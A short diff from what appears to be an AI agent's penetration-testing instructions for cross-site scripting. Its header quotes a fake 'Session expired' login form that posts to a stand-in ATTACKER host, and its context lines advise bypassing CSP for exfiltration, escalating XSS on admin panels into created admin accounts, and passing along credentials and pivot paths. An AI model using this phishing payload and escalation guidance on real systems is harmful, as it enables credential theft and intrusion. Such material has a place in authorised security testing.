@@ -305,7 +305,7 @@ document.body.innerHTML='<h1>Session expired</h1><form action=https://ATTACKER/p
 - **Need to bypass CSP for exfiltration**: Check Deep Reference for advanced CSP bypass
 - **XSS on admin panel**: Attempt CSRF to escalate privileges, create admin accounts
 
-Update `engagement/state.md` with any new credentials, access, vulns, or pivot paths discovered.
+Report in your return summary: any new credentials, access, vulns, or pivot paths discovered.
 
 When routing, pass along: reflection point, context, working payload, and CSP policy (if present).
 
